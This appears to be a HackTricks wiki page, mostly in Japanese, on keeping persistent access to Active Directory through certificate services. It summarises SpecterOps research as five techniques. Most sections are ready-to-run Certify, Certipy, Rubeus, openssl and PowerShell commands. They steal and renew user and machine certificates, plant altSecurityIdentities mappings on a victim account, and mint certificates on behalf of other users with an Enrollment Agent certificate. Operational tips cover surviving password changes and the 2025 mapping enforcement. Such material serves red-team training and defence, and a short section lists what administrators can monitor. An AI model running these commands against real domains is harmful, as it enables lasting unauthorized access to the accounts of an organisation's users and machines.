# AD CS アカウントの永続化

{{#include ../../../banners/hacktricks-training.md}}

**これは [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf) にある素晴らしい調査のアカウント永続化章の小さな要約です**

## 証明書を用いたアクティブユーザー資格情報窃取の理解 – PERSIST1

ユーザーがドメイン認証を許可する証明書を要求できるシナリオでは、攻撃者はこの証明書を要求して盗用し、ネットワーク上で永続性を維持する機会を得ます。デフォルトでは、Active Directory の `User` テンプレートはそのような要求を許可しますが、場合によっては無効化されていることもあります。

[Certify](https://github.com/GhostPack/Certify) または [Certipy](https://github.com/ly4k/Certipy) を使用して、クライアント認証を許可する有効なテンプレートを検索し、それを要求できます：
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
証明書の強みは、有効である限り、パスワードが変更されても、それが属するユーザーとして認証できる点にあります。

PEMをPFXに変換して、それを使ってTGTを取得できます:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> 注意: 他の技術（THEFT sections 参照）と組み合わせると、証明書ベースの認証は LSASS に触れず、非昇格コンテキストからでも永続的なアクセスを可能にします。

## 証明書を使ったマシン永続化の取得 - PERSIST2

攻撃者がホスト上で昇格した権限を持っている場合、既定の `Machine` テンプレートを使用して、侵害されたシステムのマシンアカウントの証明書を登録できます。マシンとして認証すると、ローカルサービス向けに S4U2Self が有効になり、ホスト上で持続的な永続化を実現できます：
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## 証明書の更新による永続性の延長 - PERSIST3

証明書テンプレートの有効期間と更新期間を悪用すると、攻撃者は長期的なアクセスを維持できます。既に発行された証明書とその秘密鍵を所有していれば、期限切れ前に更新することで、元のプリンシパルに紐づく追加のリクエスト痕跡を残さずに、新しい長期間有効な資格情報を取得できます。
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> 運用のヒント: 攻撃者が保持する PFX ファイルの有効期間を追跡し、早めに更新してください。更新により、更新された証明書に最新の SID マッピング拡張が含まれることがあり、より厳格な DC マッピングルール下でも使用可能なままになることがあります（次節参照）。

## 明示的な証明書マッピングの設定 (altSecurityIdentities) – PERSIST4

ターゲットアカウントの `altSecurityIdentities` 属性に書き込みできる場合、攻撃者が制御する証明書をそのアカウントに明示的にマッピングできます。これはパスワード変更後も持続し、強力なマッピング形式を使用する場合は最新の DC 適用下でも機能し続けます。

大まかな流れ:

1. 自分で制御できる client-auth 証明書を取得または発行する（例：`User` テンプレートを自分で申請する）。
2. 証明書から強力な識別子を抽出する（Issuer+Serial、SKI、または SHA1-PublicKey）。
3. その識別子を使用して被害者プリンシパルの `altSecurityIdentities` に明示的なマッピングを追加する。
4. 自分の証明書で認証する。DC は明示的マッピングを通じてそれを被害者に紐付ける。

例 (PowerShell)：強力な Issuer+Serial マッピングを使用:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
次に、あなたのPFXで認証します。Certipyは直接TGTを取得します:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### 強力な `altSecurityIdentities` マッピングの構築

実務では、**Issuer+Serial** と **SKI** のマッピングが、攻撃者が保持する証明書から構築できる最も簡単な強力な形式です。これは **2025年2月11日** 以降に重要になります。DCs がデフォルトで **Full Enforcement** になり、弱いマッピングは信頼できなくなるためです。
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
注記
- 強力なマッピングタイプのみを使用する: `X509IssuerSerialNumber`, `X509SKI`, または `X509SHA1PublicKey`。弱い形式（Subject/Issuer、Subject-only、RFC822 email）は非推奨で、DCのポリシーでブロックされる可能性がある。
- このマッピングは**user**および**computer**オブジェクトの両方で機能するため、コンピュータアカウントの`altSecurityIdentities`への書き込みアクセスがあれば、そのマシンとして永続化するのに十分である。
- 証明書チェーンはDCが信頼するルートまで構築される必要がある。NTAuthに登録された Enterprise CAs は通常信頼されており、環境によっては public CAs も信頼される場合がある。
- DCに Smart Card Logon EKU がないか `KDC_ERR_PADATA_TYPE_NOSUPP` を返して PKINIT が失敗する場合でも、Schannel 認証は永続化手段として有用であり続ける。

For more on weak explicit mappings and attack paths, see:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

If you obtain a valid Certificate Request Agent/Enrollment Agent certificate, you can mint new logon-capable certificates on behalf of users at will and keep the agent PFX offline as a persistence token. Abuse workflow:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
エージェント証明書またはテンプレートの権限を取り消すことで、この永続化を排除できます。

運用上の注意
- Modern `Certipy` versions support both `-on-behalf-of` and `-renew`, so an attacker holding an Enrollment Agent PFX can mint and later renew leaf certificates without re-touching the original target account.
- If PKINIT-based TGT retrieval is not possible, the resulting on-behalf-of certificate is still usable for Schannel authentication with `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.

## 2025年 Strong Certificate Mapping Enforcement：永続化への影響

Microsoft KB5014754 はドメインコントローラーでの Strong Certificate Mapping Enforcement を導入しました。2025年2月11日以降、DC はデフォルトで Full Enforcement となり、弱い/曖昧なマッピングを拒否します。実務上の影響は次のとおりです：

- SID マッピング拡張を欠く 2022 年以前の証明書は、DC が Full Enforcement の場合に暗黙のマッピングに失敗する可能性があります。攻撃者は、AD CS を通じて証明書を更新して SID 拡張を取得するか、`altSecurityIdentities`（PERSIST4）に強力な明示的マッピングを植え付けることでアクセスを維持できます。
- Issuer+Serial、SKI、SHA1-PublicKey のような強力な形式を使った明示的なマッピングは引き続き機能します。Issuer/Subject、Subject-only、RFC822 のような弱い形式はブロックされる可能性があり、永続化には使用すべきではありません。

管理者は以下を監視してアラートを出すべきです：
- `altSecurityIdentities` の変更および Enrollment Agent と User 証明書の発行/更新。
- on-behalf-of リクエストや異常な更新パターンに関する CA 発行ログ。

## 参考

- Microsoft. KB5014754: Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings).
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- SpecterOps. ADCS ESC14 Abuse Technique (explicit `altSecurityIdentities` abuse on user/computer objects).
https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/
- Certipy Wiki – Command Reference (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- Almond Offensive Security. Authenticating with certificates when PKINIT is not supported.
https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html

{{#include ../../../banners/hacktricks-training.md}}
